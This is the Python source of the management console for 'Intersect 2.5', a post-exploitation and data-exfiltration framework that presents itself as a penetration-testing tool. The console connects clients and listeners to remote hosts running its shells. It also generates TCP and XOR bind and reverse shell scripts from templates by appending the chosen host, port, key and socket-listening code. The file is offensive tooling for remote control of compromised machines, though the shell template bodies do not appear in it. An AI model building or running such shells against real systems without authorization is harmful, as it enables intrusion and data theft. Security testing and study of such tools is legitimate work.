#!/usr/bin/python
# Intersect Framework (c) 2012
# Framework interaction utility
# https://ohdae.github.com/Intersect-2.5/

import os, sys, re
from src import core
from src import shells
import string
import signal
import shutil

# define general information used through-out this script
Shell_Templates = ("src/Templates/Shells/")
Scripts = ("Scripts/")
active_sessions = {}
fw_version = "2.5.4"
tab_complete = True
header = " => "
clients = [ "tcp", "xor" ]
listeners = [ "tcp", "xor" ]

# check if readline is installed. we can't use tab completion without it. :(
try:
    import readline
except ImportError:
    print "[!] Python readline is not installed. Tab completion will be disabled."
    tab_complete = False
    core.logging.info("Python Readline library not installed. Tab completion is disabled.")

if tab_complete == True:
    readline.parse_and_bind("tab: complete")


def about_dialog():
    print("""\n
                Intersect Framework
                  revision %s
              created by bindshell labs
    
    Intersect is a post-exploitation framework written in Python.
    The purpose of this framework and the included modules are to
    assist penetration testers in automating and controlling many
    post-exploitation and data exfiltration tasks. There is full
    documentation, guides and license information available in the
    Docs directory.
    
    Using the Management application, you can interact with remote
    targets that are running an Intersect shell, whether they are
    serving a client or listener. You can interact with multiple
    remote targets at once, setup listeners to accept multiple
    connections and execute Intersect modules remotely.
    
    bindshell labs: http://bindshell.it.cx
    project home:   https://ohdae.github.com/Intersect-2.5
    repository:     https://github.com/ohdae/Intersect-2.5\n
    """ % fw_version)


# configure tab completion commands and such.
# one day i'll fix this so each aspect of the script pulls from an individual wordlist
class Completer:
    def __init__(self):
        self.words = ["help", "about", "client", "clear", "listener", "files", "exit",
                        "exec", "download", "upload", "mods", "quit", "info", "killme", "build",
                        "addr", "port", "name", "key", "view", "type" ]
        self.prefix = ":"

    def complete(self, prefix, index):
        if prefix != self.prefix:
            self.matching_words = [w for w in self.words if w.startswith(prefix)]
            self.prefix = prefix
        else:
            pass
        try:
            return self.matching_words[index]
            return self.match_mods[index]
        except IndexError:
            return None


# main Intersect console. not much to see here.
class manage(object):
    def __init__(self):
        signal.signal(signal.SIGINT, core.signalHandler)

    def main(self):
        print("""
Intersect Framework - version %s
====================================
Type :help for all available commands
\n\n""" % fw_version)

        
        while True:

            if tab_complete == True:
                completer = Completer()
                readline.set_completer(completer.complete)
                
            command = raw_input(" intersect %s " % header)
        
            if command == (":client"):
                interact.client()
                    
            elif command == (":listener"):
                interact.listener()
                
            elif command == (":handler"):
                interact.handler()
                
            elif command == (":shell"):
                build.server()
                
            elif command == (":payload"):
                build.payload()
                
            elif command == (":logging"):
                options.logs()
                
            elif command == (":globals"):
                options.globals()
                
            elif command == (":storage"):
                options.storage()
                
            elif command == (":help"):
                print("\n\n          [ Intersect ]")
                print("     :about  =>  display the 'about' dialog")
                print("     :clear  =>  clears the screen")
                print("   :modules  =>  view or import modules")
                print("      :help  =>  display this help menu")
                print("      :exit  =>  exit Intersect completely\n")
                print("           [ Build ]")
                print("     :shell  =>  create server-side Intersect shell")
                print("   :payload  =>  create staged or web-dl payload\n")
                print("           [ Interact ] ")
                print("    :client  =>  start standalone client")
                print("  :listener  =>  start standalone listener")
                print("   :handler  =>  setup payload handler & shell\n")
                print("           [ Configure ] ")
                print("   :logging  =>  customize log options")
                print("   :globals  =>  set global variables")
                print("   :storage  =>  change storage directory\n")
                  
            elif command == (":about"):
                about_dialog()
                
            elif command == (":exit"):
                print("[!] Shutting down Intersect!")
                sys.exit(0)
                
            elif command == (":quit"):
                print("[!] Shutting down Intersect!")
                sys.exit(0)
                                        
            elif command == (":clear"):
                os.system("clear")
                
            else:
                core.inputerr()


# functions for interacting with remote hosts. setup clients, listeners and handlers.
class interact:
    def __init__(self):
        self.HOST = ""
        self.PORT = ""
        self.TYPE = ""
        self.NAME = ""
        self.PKEY = ""
        
    def handler(self): # place-holder 
        os.system("clear")
        print("\nConfigure handler and shell settings")
        print("Type :help for all commands")
        

    def client(self):
        os.system("clear")
        print("\nConfigure your client settings")
        print("Type :help for all commands")
        
        while True:
            
            option = raw_input(" client %s" % header)
            
            if option == (":help"):
                print("\n")
                print("     :type  =>  shell type [tcp, xor]")
                print("   :addr i  =>  remote IP/host")
                print("   :port p  =>  remote port")
                print("   :name n  =>  session name")
                print("    :key k  =>  xor private key")
                print("    :start  =>  start client shell")
                print("     :view  =>  display current settings")
                print("     :help  =>  view this menu")
                print("    :clear  =>  clears the screen")
                print("     :exit  =>  return to main menu\n")
                
            elif option.startswith(":type"):
                self.TYPE = core.get_choice(option)
                if self.TYPE in clients:
                    print("type: %s" % self.TYPE)
                else:
                    print("[!] invalid type!")
                    
            elif option.startswith(":addr"):
                self.HOST = core.get_choice(option)
                if self.HOST != "" and core.valid_ip(self.HOST):
                    print("ip address: %s" % self.HOST)
                else:
                    print("[!] invalid IPv4 address!")
                    
            elif option.startswith(":port"):
                self.PORT = core.get_choice(option)
                if self.PORT != "" and self.PORT.isdigit():
                    print("port: %s" % self.PORT)
                else:
                    print("[!] invalid port number!")
                    
            elif option.startswith(":name"):
                self.NAME = core.get_choice(option)
                if self.NAME != "":
                    print("name: %s" % self.NAME)
                else:
                    print("[!] invalid name!")
                
            elif option.startswith(":key"):
                self.PKEY = core.get_choice(option)
                if self.PKEY != "":
                    print("key: %s" % self.PKEY)
                else:
                    print("[!] invalid key!")
                
            elif option == (":exit"):
                manage.main()
                
            elif option == (":quit"):
                manage.main()
                
            elif option == (":view"):
                print("\nName: %s" % self.NAME)
                print("Shell: %s" % self.TYPE)
                print("Host: %s" % self.HOST)
                print("Port: %s" % self.PORT)
                print("Key: %s\n" % self.PKEY)
                
            elif option.startswith(":start"):
                if core.check_options(self.HOST, self.PORT, self.TYPE, self.PKEY, self.NAME):
                    if self.TYPE == "tcp":
                        shells.tcp.client(self.HOST, self.PORT, self.NAME)
                    elif self.TYPE == "xor":
                        shells.xor.client(self.HOST, self.PORT, self.NAME, self.PKEY)
                    else:
                        print("[!] invalid shell type!")
                    
            elif option == (":clear"):
                os.system("clear")
                    
            else:
                core.inputerr()
                    
                    
    def listener(self):
        os.system("clear")
        print("\nConfigure your listener settings")
        print("Type :help for all commands")
        
        while True:
            
            option = raw_input(" listener %s" % header)
            
            if option == (":help"):
                print("\nAvailable Options: ")
                print("     :type  =>  shell type [tcp, xor]")
                print("   :addr i  =>  local IP")
                print("   :port p  =>  local port")
                print("   :name n  =>  session name")
                print("    :key k  =>  xor private key [optional]")
                print("    :start  =>  start listener shell")
                print("     :view  =>  display current settings")
                print("     :help  =>  view this menu")
                print("    :clear  =>  clears the screen")
                print("     :exit  =>  return to main menu")
                
            elif option.startswith(":type"):
                self.TYPE = core.get_choice(option)
                if self.TYPE in listeners and self.TYPE != "":
                    print("type: %s" % self.TYPE)
                else:
                    print("[!] invalid type!")
                    
            elif option.startswith(":addr"):
                self.HOST = core.get_choice(option)
                if self.HOST != "" and core.valid_ip(self.HOST):
                    print("host: %s" % self.HOST)
                else:
                    print("[!] invalid IPv4 address!")
                    
            elif option.startswith(":port"):
                self.PORT = core.get_choice(option)
                if self.PORT != "" and self.PORT.isdigit():
                    print("port: %s" % self.PORT)
                else:
                    print("[!] invalid port number!")
                    
            elif option.startswith(":name"):
                self.NAME = core.get_choice(option)
                if self.NAME != "":
                    print("name: %s" % self.NAME)
                else:
                    print("[!] invalid session name!")
                
            elif option.startswith(":key"):
                self.PKEY = core.get_choice(option)
                if self.PKEY != "":
                    print("key: %s" % self.PKEY)
                else:
                    print("[!] invalid key!")
                
            elif option == (":exit"):
                manage.main()
                
            elif option == (":quit"):
                manage.main()
                
            elif option == (":view"):
                print("\nName: %s" % self.NAME)
                print("Shell: %s" % self.TYPE)
                print("Host: %s" % self.HOST)
                print("Port: %s" % self.PORT)
                print("Key: %s\n" % self.PKEY)
                
            elif option.startswith(":start"):
                if core.check_options(self.HOST, self.PORT, self.TYPE, self.PKEY, self.NAME):
                    if self.TYPE == "tcp":
                        shells.tcp.client(self.HOST, self.PORT, self.NAME)
                    elif self.TYPE == "xor":
                        shells.xor.client(self.HOST, self.PORT, self.NAME, self.PKEY)
                    else:
                        print("[!] invalid shell type!")
                                        
            elif option == (":clear"):
                os.system("clear")
                    
            else:
                core.inputerr()


# functions to build payloads and Intersect shells
class build:
    def __init__(self):
        self.HOST = ""
        self.PORT = ""
        self.TYPE = ""
        self.NAME = ""
        self.PKEY = ""
        
        
    def payload(self): # place holder
        os.system("clear")
        print("\nConfigure your payload settings")
        

    def server(self):
        os.system("clear")
        print("Build Intersect shell")
        print("""
              1 => TCP bind
              2 => TCP reverse
              3 => XOR TCP bind
              4 => XOR TCP reverse
              5 => Return to Main Menu

              """)
              
              
        while True:
            choice = raw_input(" build => ")
            
            signal.signal(signal.SIGINT, core.signalHandler)
                  
            if choice == "1":
                template = (Shell_Templates+"tcpbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" tcp-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" bind IP => ")
                if core.valid_ip(host):
                    port = raw_input(" bind port => ")
                    if port.isdigit():
                        makeshell = open(Scripts+name, "a")
                        makeshell.write("\nHOST = '%s'" % host)
                        makeshell.write("\nPORT = %s" % port)
                        makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                        makeshell.write("\nconn.bind((HOST, PORT))")
                        makeshell.write("\nconn.listen(5)")
                        makeshell.write("\naccept()")
                        makeshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                
                
            elif choice == "2":
                template = (Shell_Templates+"tcprev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" tcp-rev => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" listen IP => ")
                if core.valid_ip(host):
                    port = raw_input(" listen port => ")
                    if port.isdigit():
                        newshell = open(Scripts+name, "a")
                        newshell.write("\n    HOST = '%s'" % host)
                        newshell.write("\n    PORT = %s" % port)
                        newshell.write("\n\nglobalvars()")
                        newshell.write("\nmain()")
                        newshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                                
            elif choice == "3":
                template = (Shell_Templates+"xorbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" xor-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" bind IP => ")
                if core.valid_ip(host):
                    port = raw_input(" bind port => ")
                    pin = raw_input(" xor key => ")
                    if port.isdigit():
                        makeshell = open(Scripts+name, "a")
                        makeshell.write("\nHOST = '%s'" % host)
                        makeshell.write("\nPORT = %s" % port)
                        makeshell.write("\npin = '%s'" % pin)
                        makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                        makeshell.write("\nconn.bind((HOST, PORT))")
                        makeshell.write("\nconn.listen(5)")
                        makeshell.write("\naccept()")
                        makeshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                    
            elif choice == "4":
                template = (Shell_Templates+"xorrev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" xor-rev => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" listen IP => ")
                if core.valid_ip(host):
                    port = raw_input(" listen port => ")
                    pin = raw_input(" xor key => ")
                    if port.isdigit():
                        makeshell = open(Scripts+name, "a")
                        makeshell.write("\n    HOST = '%s'" % host)
                        makeshell.write("\n    PORT = %s" % port)
                        makeshell.write("\n    pin = '%s'" % pin)
                        makeshell.write("\n\nglobalvars()")
                        makeshell.write("\nmain()")
                        makeshell.close()
                        makeshell.close()
                    
                        print("[+] New shell created!")
                        print("[+] Location: %s" % Scripts+name)
                        manage.main()
                    else:
                        print("[!] Invalid port!")
                        build.server()
                else:
                    print("[!] Invalid IPv4 address!")
                    build.server()
                
            elif choice == "5":
                os.system("clear")
                manage.main()
                
            else:
                core.inputerr()



if __name__=='__main__':
    core.banner()
    manage = manage()
    build = build()
    interact = interact()
    manage.main()

